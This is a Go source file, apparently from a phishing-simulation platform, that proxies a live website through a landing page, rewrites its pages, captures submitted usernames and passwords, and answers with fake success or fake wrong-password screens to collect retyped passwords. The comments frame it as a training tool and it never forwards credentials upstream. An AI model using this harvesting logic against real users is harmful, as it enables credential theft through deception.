package web

// Reverse-proxy landing pages. A page of kind "proxy" does not serve a stored
// snapshot: it forwards the upstream site live through <prefix>/px/, rewrites
// the document and stylesheets, injects a runtime URL adapter, and captures
// credentials when the victim submits a password. Nothing is stored on disk at
// clone time, so the upstream must stay reachable while the campaign runs.
//
// Credential-bearing POSTs are never forwarded upstream: a training exercise
// must not perform a real login (or any real action) with the victim's real
// password. They are recorded and answered with a fake success, which keeps
// the SPA on its happy path.

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"html"
	"io"
	"mime"
	"mime/multipart"
	"net/http"
	"net/url"
	"strings"
	"time"
	"unicode"

	"phishsim/internal/core/store"
	"phishsim/internal/features/clone"
	"phishsim/internal/services/detect"
)

const (
	// proxyMaxResponse bounds one upstream response held in memory. A proxied
	// bundle or image above this size is truncated (and logged) rather than
	// allowed to exhaust the server.
	proxyMaxResponse = 32 << 20
	// proxySniffMax is the largest request body read for credential sniffing.
	// Anything larger is streamed upstream, unexamined.
	proxySniffMax = 2 << 20
	proxyTimeout  = 30 * time.Second

	proxyUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
		"(KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
)

// proxyClient forwards upstream requests. Redirects are returned to the
// browser (rewritten) instead of followed, and TLS verification is off because
// training hosts routinely use self-signed certificates.
var proxyClient = &http.Client{
	Timeout: proxyTimeout,
	Transport: &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
		ForceAttemptHTTP2:   true,
		MaxIdleConns:        64,
		MaxIdleConnsPerHost: 16,
		IdleConnTimeout:     60 * time.Second,
	},
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

var errBadProxySource = errors.New("proxy source url invalid")

// proxyOrigin returns the scheme://host part of a page's source URL.
func proxyOrigin(page store.LandingPage) (*url.URL, error) {
	u, err := url.Parse(strings.TrimSpace(page.SourceURL))
	if err != nil || u.Host == "" || (u.Scheme != "http" && u.Scheme != "https") {
		return nil, errBadProxySource
	}
	u.Path, u.RawPath, u.RawQuery, u.Fragment = "", "", "", ""
	return u, nil
}

// proxyRoot is the URL prefix that carries proxied responses.
func proxyRoot(prefix string) string { return strings.TrimRight(prefix, "/") + "/px/" }

// serveProxy dispatches a request for a proxy landing page. prefix is the
// page's public base ("/l/<rid>" or "/p/<id>"). res/camp are nil for previews.
func (s *Server) serveProxy(w http.ResponseWriter, r *http.Request, page store.LandingPage, res *store.Result, camp *store.Campaign, prefix string) {
	if _, err := proxyOrigin(page); err != nil {
		s.notFound(w)
		return
	}
	root := proxyRoot(prefix)
	suffix := strings.TrimPrefix(r.URL.EscapedPath(), strings.TrimRight(prefix, "/"))
	if suffix == "" || suffix == "/" {
		if res != nil && camp != nil {
			s.Store.MarkClicked(*res, s.remoteIP(r), r.UserAgent(), r.Header.Get("Referer"))
		}
		// Send the browser to the live upstream path so every relative URL in
		// the document resolves inside the proxy prefix.
		src, _ := url.Parse(page.SourceURL)
		p := "/"
		if src != nil {
			p = src.EscapedPath()
			if p == "" {
				p = "/"
			}
			if src.RawQuery != "" {
				p += "?" + src.RawQuery
			}
			if src.Fragment != "" {
				p += "#" + src.Fragment
			}
		}
		http.Redirect(w, r, root+strings.TrimPrefix(p, "/"), http.StatusFound)
		return
	}
	if !strings.HasPrefix(suffix, "/px/") {
		s.notFound(w)
		return
	}
	s.proxyForward(w, r, page, res, camp, prefix, strings.TrimPrefix(suffix, "/px/"))
}

// proxyForward performs one upstream exchange. rel is the escaped path below
// the proxy root (no leading slash).
func (s *Server) proxyForward(w http.ResponseWriter, r *http.Request, page store.LandingPage, res *store.Result, camp *store.Campaign, prefix, rel string) {
	up, err := proxyOrigin(page)
	if err != nil {
		s.notFound(w)
		return
	}
	if s.Cfg.CloneDenyPrivate && clone.IsPrivateHost(up.Host) {
		s.proxyError(w, r, http.StatusForbidden, "目标地址被拒绝（deny-private）")
		return
	}
	ref, err := url.Parse("/" + rel)
	if err != nil {
		s.proxyError(w, r, http.StatusBadRequest, "无效的代理路径")
		return
	}
	target := *up
	target.Path = ref.Path
	target.RawPath = ref.RawPath
	target.RawQuery = r.URL.RawQuery
	root := proxyRoot(prefix)

	// Sniffing is skipped above proxySniffMax so a large upload still streams.
	var body []byte
	if r.Body != nil && r.Method != http.MethodGet && r.Method != http.MethodHead {
		if r.ContentLength > proxySniffMax {
			body = nil
		} else {
			body, _ = io.ReadAll(io.LimitReader(r.Body, proxySniffMax+1))
			if len(body) > proxySniffMax {
				body = nil
			}
		}
	}

	// A POST/JSON payload carrying a password is a login attempt: capture it
	// and answer locally. Forwarding it would attempt a real login upstream.
	if len(body) > 0 {
		fields := proxyCredentialFields(r.Header.Get("Content-Type"), body)
		password := pickField(fields, "password", "passwd", "pass", "pwd", "密码")
		if password != "" {
			s.proxyCapture(w, r, page, res, camp, fields, password)
			return
		}
	}

	var reqBody io.Reader
	if len(body) > 0 {
		reqBody = bytes.NewReader(body)
	} else if r.Body != nil && r.Method != http.MethodGet && r.Method != http.MethodHead {
		reqBody = r.Body
	}
	req, err := http.NewRequestWithContext(r.Context(), r.Method, target.String(), reqBody)
	if err != nil {
		s.proxyError(w, r, http.StatusBadGateway, "构造上游请求失败")
		return
	}
	for k, vs := range r.Header {
		lk := strings.ToLower(k)
		switch lk {
		case "connection", "proxy-connection", "keep-alive", "te", "trailer",
			"transfer-encoding", "upgrade", "host", "accept-encoding", "content-length":
			continue
		}
		for _, v := range vs {
			req.Header.Add(k, v)
		}
	}
	req.Header.Set("User-Agent", r.UserAgent())
	if req.Header.Get("User-Agent") == "" {
		req.Header.Set("User-Agent", proxyUserAgent)
	}
	if o := r.Header.Get("Origin"); o != "" {
		req.Header.Set("Origin", up.Scheme+"://"+up.Host)
	}
	if rf := r.Header.Get("Referer"); rf != "" {
		req.Header.Set("Referer", proxyUnmapURL(rf, up, prefix))
	}
	if ip := s.remoteIP(r); ip != "" {
		req.Header.Set("X-Forwarded-For", ip)
	}

	resp, err := proxyClient.Do(req)
	if err != nil {
		s.log().Warn("proxy upstream failed", "url", target.String(), "err", err)
		s.proxyError(w, r, http.StatusBadGateway, "上游站点暂时不可达")
		return
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(io.LimitReader(resp.Body, proxyMaxResponse+1))
	if err != nil {
		s.proxyError(w, r, http.StatusBadGateway, "读取上游响应失败")
		return
	}
	if len(raw) > proxyMaxResponse {
		s.log().Warn("proxy response truncated", "url", target.String(), "limit", proxyMaxResponse)
		raw = raw[:proxyMaxResponse]
	}

	ct := resp.Header.Get("Content-Type")
	lct := strings.ToLower(ct)
	isDoc := strings.Contains(lct, "text/html") || strings.Contains(lct, "application/xhtml")
	switch {
	case isDoc:
		if ct == "" {
			ct = "text/html; charset=utf-8"
		}
		body := clone.ProxyRewriteHTML(raw, resp.Request.URL, proxyRoot(prefix))
		out := string(body)
		if res != nil {
			out = injectBeacon(out, res.Rid)
		}
		out = injectMobileCompat(out)
		raw = []byte(out)
	case strings.Contains(lct, "text/css"):
		raw = clone.ProxyRewriteCSS(raw, resp.Request.URL, proxyRoot(prefix))
	}
	if ct == "" {
		ct = mime.TypeByExtension(strings.ToLower(pathExt(target.Path)))
	}
	if ct == "" {
		ct = "application/octet-stream"
	}

	for _, k := range []string{"Cache-Control", "Expires", "Last-Modified", "ETag",
		"Vary", "Content-Disposition", "Content-Language"} {
		if v := resp.Header.Get(k); v != "" {
			w.Header().Set(k, v)
		}
	}
	// Never let the upstream set cookies for the portal root, framing rules,
	// HSTS, or a CSP that would block the injected adapter.
	for _, c := range resp.Header.Values("Set-Cookie") {
		if nc := proxyCookie(c, root); nc != "" {
			w.Header().Add("Set-Cookie", nc)
		}
	}
	if loc := resp.Header.Get("Location"); loc != "" {
		if abs, err := url.Parse(loc); err == nil {
			// Resolve relative redirects against the upstream request URL before
			// deciding whether they stay inside the proxy.
			if resp.Request != nil && resp.Request.URL != nil {
				abs = resp.Request.URL.ResolveReference(abs)
			}
			if strings.EqualFold(abs.Host, up.Host) && (abs.Scheme == "http" || abs.Scheme == "https") {
				w.Header().Set("Location", proxyRoot(prefix)+strings.TrimPrefix(abs.RequestURI(), "/"))
			} else {
				w.Header().Set("Location", abs.String())
			}
		}
	}
	w.Header().Set("Content-Type", ct)
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.WriteHeader(resp.StatusCode)
	if r.Method != http.MethodHead {
		_, _ = w.Write(raw)
	}
}

// proxyCapture records a password-bearing request and answers locally.
func (s *Server) proxyCapture(w http.ResponseWriter, r *http.Request, page store.LandingPage, res *store.Result, camp *store.Campaign, fields map[string][]string, password string) {
	// A forged cross-site request must not poison capture data; it is also
	// never forwarded, because it carries someone's password.
	if res == nil || camp == nil || camp.Status == "terminated" || crossSite(r) {
		s.proxyFakeLogin(w, r, page, false, false)
		return
	}
	if detect.Classify(r.UserAgent()) != detect.Human {
		s.proxyFakeLogin(w, r, page, false, true)
		return
	}
	username := pickField(fields, "username", "email", "login", "account", "userid", "用户名", "账号")
	if !page.CaptureCredentials {
		s.proxyFakeLogin(w, r, page, false, true)
		return
	}
	if !page.CapturePasswords {
		password = ""
		blankPasswords(fields)
	}
	fields = capFields(fields)
	username = truncate(username, maxCapturedValue)
	password = truncate(password, maxCapturedValue)

	attempts, _ := s.Store.CountSubmissions(res.ID)
	attempt := attempts + 1
	if err := s.Store.RecordSubmission(*res, s.remoteIP(r), r.UserAgent(), r.Header.Get("Referer"), username, password, fields); err != nil {
		s.log().Error("record proxy submission", "err", err)
	}
	s.log().Info("credential submitted (proxy)",
		"campaign", res.CampaignID, "email", res.Email, "has_username", username != "", "attempt", attempt, "ip", s.remoteIP(r))

	// FailAttempts rejects the first N logins with a generic "wrong password"
	// prompt; every typed variant is still stored.
	if s.Cfg.FailAttempts > 0 && attempt <= s.Cfg.FailAttempts {
		s.proxyFakeLogin(w, r, page, true, true)
		return
	}
	s.proxyFakeLogin(w, r, page, false, true)
}

// proxyFakeLogin answers an intercepted login without touching the upstream.
// failed=true simulates a wrong password; done=false means the caller must not
// present a success screen (non-human or cross-site traffic gets the redirect
// target only).
func (s *Server) proxyFakeLogin(w http.ResponseWriter, r *http.Request, page store.LandingPage, failed, done bool) {
	jsonLike := proxyWantsJSON(r)
	if failed {
		msg := strings.TrimSpace(page.ErrorMessage)
		if msg == "" {
			msg = "用户名或密码错误，请重新输入"
		}
		if jsonLike {
			w.Header().Set("Content-Type", "application/json; charset=utf-8")
			w.WriteHeader(http.StatusUnauthorized)
			b, _ := json.Marshal(map[string]any{
				"ok": false, "success": false, "code": 401,
				"message": msg, "msg": msg, "data": nil,
			})
			_, _ = w.Write(b)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(proxyRetryHTML(page)))
		return
	}
	// An XHR/fetch caller must receive JSON, never a redirect: the SPA expects a
	// response body and would treat a 303 as a network/session failure.
	if !jsonLike && done && page.RedirectURL != "" && isAbsoluteHTTP(page.RedirectURL) {
		http.Redirect(w, r, page.RedirectURL, http.StatusSeeOther)
		return
	}
	if jsonLike {
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"ok":true,"success":true,"code":0,"message":"ok","msg":"ok","token":"","access_token":"","expires_in":7200,"data":{}}`))
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	success := proxySuccessHTML
	if !hasCJK(page.ErrorMessage) && strings.TrimSpace(page.ErrorMessage) != "" {
		success = proxySuccessHTMLEN
	}
	_, _ = w.Write([]byte(success))
}

// proxyWantsJSON reports whether the caller expects a JSON body (XHR/fetch)
// rather than a document navigation.
func proxyWantsJSON(r *http.Request) bool {
	if strings.EqualFold(r.Header.Get("X-Requested-With"), "XMLHttpRequest") {
		return true
	}
	if d := strings.ToLower(r.Header.Get("Sec-Fetch-Dest")); d == "document" || d == "iframe" {
		return false
	}
	if strings.Contains(strings.ToLower(r.Header.Get("Content-Type")), "application/json") {
		return true
	}
	accept := strings.ToLower(r.Header.Get("Accept"))
	if strings.Contains(accept, "application/json") && !strings.Contains(accept, "text/html") {
		return true
	}
	return false
}

// proxyCredentialFields parses a request body into a field map for credential
// detection. It understands form-urlencoded, multipart, and flat/nested JSON.
func proxyCredentialFields(ct string, body []byte) map[string][]string {
	fields := map[string][]string{}
	lct := strings.ToLower(ct)
	switch {
	case strings.Contains(lct, "application/json"):
		var m map[string]any
		if err := json.Unmarshal(body, &m); err != nil {
			return fields
		}
		proxyFlattenJSON("", m, fields)
	case strings.Contains(lct, "multipart/form-data"):
		_, params, err := mime.ParseMediaType(ct)
		if err != nil || params["boundary"] == "" {
			return fields
		}
		mr := multipart.NewReader(bytes.NewReader(body), params["boundary"])
		for {
			p, err := mr.NextPart()
			if err != nil {
				break
			}
			if p.FormName() == "" {
				continue
			}
			v, _ := io.ReadAll(io.LimitReader(p, maxCapturedValue))
			fields[p.FormName()] = append(fields[p.FormName()], string(v))
		}
	default:
		if vals, err := url.ParseQuery(string(body)); err == nil {
			for k, vs := range vals {
				fields[k] = vs
			}
		}
	}
	return fields
}

// proxyFlattenJSON flattens nested objects one level deep (dot keys) so a login
// payload like {"user":{"password":"x"}} is still recognised.
func proxyFlattenJSON(prefixKey string, m map[string]any, out map[string][]string) {
	for k, v := range m {
		key := k
		if prefixKey != "" {
			key = prefixKey + "." + k
		}
		switch x := v.(type) {
		case map[string]any:
			proxyFlattenJSON(key, x, out)
		case []any:
			for _, it := range x {
				out[key] = append(out[key], stringify(it))
			}
		default:
			out[key] = append(out[key], stringify(x))
		}
	}
}

// proxyUnmapURL maps a portal URL (Referer) back to the upstream origin.
func proxyUnmapURL(raw string, up *url.URL, prefix string) string {
	u, err := url.Parse(raw)
	if err != nil {
		return raw
	}
	root := proxyRoot(prefix)
	if strings.HasPrefix(u.EscapedPath(), root) || strings.HasPrefix(u.Path, strings.TrimRight(root, "/")) {
		rest := strings.TrimPrefix(strings.TrimPrefix(u.EscapedPath(), root), "/")
		out := up.Scheme + "://" + up.Host + "/" + rest
		if u.RawQuery != "" {
			out += "?" + u.RawQuery
		}
		return out
	}
	return raw
}

// proxyCookie re-scopes an upstream Set-Cookie to the proxy prefix so the
// browser sends it back on proxied requests (and never to the portal root).
func proxyCookie(raw, root string) string {
	c, err := http.ParseSetCookie(raw)
	if err != nil || c.Name == "" {
		return ""
	}
	c.Domain = ""
	c.Path = root
	c.Partitioned = false
	return c.String()
}

// proxyProbe checks that a candidate proxy target is reachable and returns
// HTML, following redirects but refusing private hosts when configured.
func (s *Server) proxyProbe(raw string) (finalURL string, status int, err error) {
	req, err := http.NewRequest(http.MethodGet, raw, nil)
	if err != nil {
		return "", 0, err
	}
	req.Header.Set("User-Agent", proxyUserAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,*/*;q=0.8")
	client := &http.Client{
		Timeout: 20 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
			ForceAttemptHTTP2: true,
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return errors.New("too many redirects")
			}
			if s.Cfg.CloneDenyPrivate && clone.IsPrivateHost(req.URL.Host) {
				return errors.New("redirect to private address refused")
			}
			return nil
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()
	head, _ := io.ReadAll(io.LimitReader(resp.Body, 64<<10))
	ct := strings.ToLower(resp.Header.Get("Content-Type"))
	if !strings.Contains(ct, "text/html") && !strings.Contains(ct, "application/xhtml") &&
		!bytes.Contains(bytes.ToLower(head), []byte("<html")) &&
		!bytes.Contains(bytes.ToLower(head), []byte("<!doctype")) {
		return "", resp.StatusCode, fmt.Errorf("目标不是 HTML 页面（Content-Type %q）", resp.Header.Get("Content-Type"))
	}
	return resp.Request.URL.String(), resp.StatusCode, nil
}

// proxyError renders a small error page for the recipient. Upstream failures
// must never leak portal internals.
func (s *Server) proxyError(w http.ResponseWriter, r *http.Request, code int, msg string) {
	if proxyWantsJSON(r) {
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		w.WriteHeader(code)
		b, _ := json.Marshal(map[string]any{"ok": false, "success": false, "code": code, "message": msg})
		_, _ = w.Write(b)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(code)
	_, _ = w.Write([]byte(`<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">` +
		`<title>服务暂时不可用</title></head><body style="font-family:system-ui,sans-serif;text-align:center;padding:80px 20px;color:#444">` +
		`<h2>服务暂时不可用</h2><p>请稍后重试。</p></body></html>`))
}

// pathExt returns the lower-cased extension of a URL path, including the dot.
func pathExt(p string) string {
	i := strings.LastIndexByte(p, '.')
	if i < 0 {
		return ""
	}
	return p[i:]
}

const proxySuccessHTML = `<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">` +
	`<title>操作成功</title></head><body style="font-family:system-ui,sans-serif;text-align:center;padding:80px 20px;color:#444">` +
	`<h2>操作成功</h2><p>您可以关闭此页面。</p></body></html>`

const proxySuccessHTMLEN = `<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">` +
	`<title>Done</title></head><body style="font-family:system-ui,sans-serif;text-align:center;padding:80px 20px;color:#444">` +
	`<h2>Done</h2><p>You can close this page.</p></body></html>`

// hasCJK reports whether the text contains Han characters, used to pick
// language-appropriate chrome around the page.
func hasCJK(s string) bool {
	for _, r := range s {
		if unicode.Is(unicode.Han, r) {
			return true
		}
	}
	return false
}

// retryMessage returns the wrong-password copy for a page. An explicit
// per-page message wins; otherwise a page whose body has no Han characters is
// treated as non-Chinese and answered in English.
func retryMessage(page store.LandingPage) string {
	if msg := strings.TrimSpace(page.ErrorMessage); msg != "" {
		return msg
	}
	if body := strings.TrimSpace(page.Body); body != "" && !hasCJK(body) {
		return "Incorrect username or password. Please try again."
	}
	return "用户名或密码错误，请重新输入"
}

// proxyRetryHTML renders the wrong-password screen using the page's own copy
// so an English portal does not suddenly answer in Chinese.
func proxyRetryHTML(page store.LandingPage) string {
	msg := strings.TrimSpace(page.ErrorMessage)
	if msg == "" {
		msg = "用户名或密码错误，请重新输入"
	}
	title, back := "登录", "返回重新输入"
	if !hasCJK(msg) {
		title, back = "Sign in", "Back"
	}
	return `<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">` +
		`<title>` + title + `</title></head><body style="font-family:system-ui,sans-serif;max-width:420px;margin:80px auto;padding:0 20px">` +
		`<div style="background:#fef2f2;border:1px solid #fecaca;color:#b91c1c;padding:10px 14px;border-radius:8px;font-size:14px">` + html.EscapeString(msg) + `</div>` +
		`<p style="margin-top:16px"><a href="javascript:history.back()">` + back + `</a></p></body></html>`
}
